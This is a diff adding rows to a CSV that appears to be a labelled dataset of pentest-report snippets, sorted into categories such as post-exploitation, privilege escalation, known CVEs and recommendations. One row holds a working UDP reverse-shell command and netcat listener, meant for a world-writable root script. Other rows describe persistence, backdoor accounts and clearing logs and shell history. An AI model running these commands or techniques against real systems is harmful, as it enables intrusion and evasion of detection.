+Sensitive log files containing user credentials were publicly accessible in an open Azure Blob storage container.,Operational TTPs
+An improperly secured GCP bucket exposed confidential financial records to the public.,Operational TTPs
+"Sent phishing email with payload, user opened link.",Operational TTPs
+"Malicious link in a fake invoice email was clicked by an employee, initiating malware download.",Operational TTPs
+User was tricked into opening a document attachment containing a malicious macro.,Operational TTPs
+Moved laterally using PsExec after dumping credentials from lsass.exe.,Operational TTPs
+Used WMI to execute commands on another host using stolen credentials.,Operational TTPs
+Remotely scheduled a task using schtasks.exe to gain shell access on a second machine.,Operational TTPs
+" We found some interesting articles and papers online, which inspired us to The researchers examined the security of the Grindr dating app and found a serious error in the implementation of Grindr. The Tinder app is not based The first article on Tinder we found was an article on Quartz[2], describ- ing a possible leak of data Tinder used to have. Tinder claimed these data leaks .. happen[s] as youre developing products, and was going to be patched the same day. The issue was fixed only a week later. This leads us to believe the data privacy of Tinder users is not one of their top priorities.",Policy
+Tinder must comply with laws governing sensitive data. The Netherlands has a law called 'Wet bescherming persoonsgegevens'.,Policy
+"The European law is, however, more strict of securing the information in
+transit. This is described in the 95/46/EC[10] regulation. It says that the
+developer of the application must take care of security measurements to
+ensure the safe transit of data. This data must be protected against:
+ Accidental or unlawful destruction
+ Loss of data
+ Alteration of data
+ Unauthorized disclosure or access
+ Other forms of unlawful processing
+The interesting part of these criteria is that the developer must also
+ensure that the data is not accessible. However the API that Tinder uses
+(Kontagent) does not make use of any encryption but merely uses a base64
+encoding. This is not considered to be good encryption.",Policy
+The European law requires data in transit be protected against unauthorized access. Tinder is not in full compliance.,Policy
+The organization permits password sharing among employees for convenience. This practice violates standard security policy and increases the risk of credential misuse.,Policy
+Company policy allows unrestricted access to production databases by all developers. This contradicts the principle of least privilege and exposes sensitive data to potential abuse.,Policy
+"The organization does not enforce multi-factor authentication for remote VPN access. Although technically supported, the current policy classifies MFA as optional.",Policy
+"Data retention policies allow for indefinite storage of logs containing PII without proper encryption or access controls, increasing the risk of long-term data exposure.",Policy
+"There is no formal process in place for security review of third-party vendor software, leaving the organization vulnerable to unvetted supply chain risks.",Policy
+"Security training is not mandated by company policy for contractors, despite their access to internal systems. This oversight creates an entry point for social engineering attacks.",Policy
+Set up reverse shell and maintained access using cronjob persistence.,Post - Exploitation
+"**PoC**:
+UDP reverse shell command to add to `/tmp/clean.sh`:
+
+```bash
+sh -i >& /dev/udp/10.0.0.1/4242 0>&1
+```
+
+while listener is running as
+
+```bash
+nc -u -lvp 4242
+```",Post - Exploitation
+A reverse shell was initiated and cronjobs were inspected. Persistence was established by planting a new cronjob to initiate a reverse shell every minute.,Post - Exploitation
+Uploaded malicious Lambda function via exposed AWS credentials to establish persistence.,Post - Exploitation
+Deployed a custom SSH daemon configured to log credentials and allow attacker access through a hidden port.,Post - Exploitation
+"Planted a Python web shell into an exposed web directory, accessible via an inconspicuous URL, providing command execution through HTTP requests.",Post - Exploitation
+"The house cleaning portions of the assessment ensures that remnants of
+the penetration test are removed. Often fragments of tools or user
+accounts are left on an organizations computer which can cause security
+issues down the road. Ensuring that we are meticulous and no remnants
+of our penetration test are left over is important.
+
+After the trophies on both the lab network and exam network were completed,
+John removed all user accounts and passwords as well as the Meterpreter
+services installed on the system. OffSec should not have to remove any user
+accounts or services from the system.",Post - Exploitation
+Cleanup was performed by removing the cronjob and clearing shell history to avoid detection.,Post - Exploitation
+"Removed all known artifacts, including payload binaries and temporary logs from `/tmp` and `/var/log`, to minimize the footprint of exploitation.",Post - Exploitation
+Disabled shell command history and deleted `.bash_history` files on all compromised systems to obscure evidence of executed commands.,Post - Exploitation
+"John added administrator and root level accounts on all systems compromised. In
+addition to the administrative/root access, a Metasploit meterpreter service
+was installed on the machine to ensure that additional access could be
+established.",Post - Exploitation
+"Created a scheduled task set to run a reverse shell binary on user login, granting the attacker persistent access even after reboots.",Post - Exploitation
+"Injected malicious code into `.bashrc` for the root user, ensuring that the attacker’s payload would execute each time a privileged shell was opened.",Post - Exploitation
+Abused overly permissive IAM roles to escalate privileges in AWS environment.,Privilege Escalation
+A misconfigured GCP service account was found to have the Owner role and could be impersonated by any user with compute.instanceAdmin privileges,Privilege Escalation
+Azure VM had a managed identity with Contributor access to the subscription. Exploiting it enabled privilege escalation to subscription-wide control,Privilege Escalation
+"**Vulnerability Explanation**: The system hosts custom scripts running as root. This poses a
+security risk if the scripts are improperly secured, as it may allow
+non-privileged users the opportunity to alter these files.",Privilege Escalation
+"A specific instance of this security vulnerability was identified
+in a script designed to clean the /tmp directory - `/tmp/clean.sh`. This script was
+executed with root-level privileges but was incorrectly set as
+world-writable. This misconfiguration could be exploited by an
+attacker to modify the script's contents and execute arbitrary
+commands with root privileges, thereby compromising the integrity
+of the system.",Privilege Escalation
+"System scan revealed multiple init scripts owned by root but writable by the www-data web server user, allowing escalation via script injection.",Privilege Escalation
+"A cron job running every minute as root was discovered to execute a shell script located in a directory with global write permissions, which enabled privilege escalation by overwriting the script.",Privilege Escalation
+"Using credentials retrieved from FTP, login was successful on SSH. Privilege escalation checks revealed a SUID binary vulnerable to buffer overflow.",Privilege Escalation
+Local enumeration revealed a SUID binary /usr/bin/vulnprog with improper bounds checking. Exploiting a buffer overflow allowed escalation to root.,Privilege Escalation
+"The binary /usr/local/bin/custom_tool was found with the SUID bit set and executed user-supplied input without sanitization, enabling execution of arbitrary commands as root.",Privilege Escalation
+"A SUID copy of nmap was found on the target system. Using interactive mode, it was possible to spawn a shell with elevated privileges.",Privilege Escalation
+Lack of MFA and centralized logging in AWS configuration.,Support - Recommendation
+Hash0 could benefit from unit tests of critical functions.,Support - Recommendation
+"With this we can conclude an answer to Does Tinder correctly implement HTTPS during communication?, namely that the Tinder API uses HTTPS to secure traffic to their service. Although we were able to circumvent this (see section 3.2.1) we had to install a custom root certificate authority on our client devices, which required full administrative control of the devices. Should this be a concern for Tinder they could consider certificate pinning[7].",Support - Recommendation
+We recommend Tinder investigate whether communication with Kontagent can be secured.,Support - Recommendation
+"John recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date. John utilized a widely adopted approach to performing penetration testing that is effective in testing how well the OffSec Labs and Exam environments are secure. Below is a breakout of how John was able to",Support - Recommendation
+**Vulnerability Fix**: The SMB should be configured with credentials and guest enumeration should be disabled.,Support - Recommendation
+**Vulnerability Fix**: Change permissions on the custom script `/tmp/clean.sh` to be writable only by root.,Support - Recommendation
+"**Vulnerability Fix**: The publishers of the Ability Server have issued a patch to fix
+this known issue. It can be found here: http://www.code-crafters.com/abilityserver/",Support - Recommendation
+1http://forum.xda-developers.com/showthread.php?t=1910873,Support - Tool Reference
+2http://www.aircrack-ng.org/doku.php?id=airbase-ng,Support - Tool Reference
+3http://mitmproxy.org,Support - Tool Reference
+4http://www.roe.ch/SSLsplit,Support - Tool Reference
+5http://www.utest.com/apphance,Support - Tool Reference
+6https://www.crittercism.com/,Support - Tool Reference
+7https://developers.facebook.com/docs/android/,Support - Tool Reference
+8http://www.kontagent.com/,Support - Tool Reference
+9https://android.googlesource.com/platform/frameworks/volley,Support - Tool Reference
+"* Connected to api.gotinder.com (107.21.49.214) port 443 (#0)
+* SSL connection using DHE-RSA-AES256-SHA
+* SSL certificate verify ok.
+> POST /user/matches/111111111111111111111111 HTTP/1.1
+> User-Agent: Tinder Android Version 2.0.1
+> Host: api.gotinder.com
+> X-Auth-Token: 11111111-2222-3333-4444-555555555555
+> Content-Length: 55
+> Content-Type: application/x-www-form-urlencoded
+
+* upload completely sent off: 55 out of 55 bytes
+< HTTP/1.1 401 Unauthorized
+{
+  ""status"": ""401"",
+  ""error"": ""X-Auth-Token, match id, and message are required to send a message""
+}",Support - Tool Reference
+"Apache server identified as version 2.4.49, vulnerable to CVE-2021-41773.",Vulnerability - Known CVE
+"OpenSSL version 1.0.2k detected, which is affected by CVE-2016-2107, allowing padding oracle attacks on AES CBC cipher.",Vulnerability - Known CVE
+"The server was running Log4j 2.14.1, which is vulnerable to CVE-2021-44228 (Log4Shell), allowing remote code execution via crafted log messages.",Vulnerability - Known CVE
+"PHP version 7.3.6 detected on the host, which is impacted by CVE-2019-11043 — a flaw in the FPM module that allows remote code execution.",Vulnerability - Known CVE
+"The Windows SMBv1 service is enabled and vulnerable to CVE-2017-0144 (EternalBlue), which may permit remote exploitation by unauthenticated users.",Vulnerability - Known CVE
+"An outdated jQuery library (1.7.2) was discovered on the web application, known to be affected by CVE-2015-9251, enabling XSS via cross-domain requests.",Vulnerability - Known CVE
+"Detected Exim mail server version 4.87, which is susceptible to CVE-2019-15846, allowing remote command execution without authentication.",Vulnerability - Known CVE
+"The attacker deployed a persistent reverse shell that survived system reboots, indicating a post-exploitation mechanism using systemd services.",Post - Exploitation
+"After gaining access, the adversary installed a rootkit to maintain stealthy control over the compromised host for extended periods.",Post - Exploitation
+"Backdoor accounts were created on the server with legitimate-looking usernames, allowing re-entry even after password resets.",Post - Exploitation
+The attacker altered log retention configurations and deleted key audit logs to obscure post-compromise activity.,Post - Exploitation
+Custom malware was compiled and deployed to establish a command and control channel through outbound HTTPS traffic.,Post - Exploitation
+It is recommended to implement network segmentation between internal and external-facing services to reduce blast radius of successful attacks.,Support - Recommendation
+Deploying a centralized logging solution like ELK or Splunk can aid in faster detection of anomalous behavior.,Support - Recommendation
+Regularly rotating API keys and secrets can help minimize risk from long-lived credential exposure.,Support - Recommendation
+Introduce automated dependency scanning tools in the CI/CD pipeline to catch known vulnerabilities early.,Support - Recommendation
+Conduct annual tabletop incident response exercises to improve preparedness and identify gaps in coordination.,Support - Recommendation
+"The login endpoint does not implement rate limiting, allowing attackers to brute force credentials without restriction.",Implementation Flaw
+"Hardcoded database credentials were found in the source code repository, posing a high risk of credential leakage.",Implementation Flaw
+"The application incorrectly stores session identifiers in local storage, which may be accessible by third-party scripts.",Implementation Flaw
+"Insufficient input validation allows special characters to be injected into SQL queries, indicating a vulnerability to SQL injection.",Implementation Flaw
+"The logout function fails to properly invalidate session tokens on the server side, leaving active sessions accessible.",Implementation Flaw
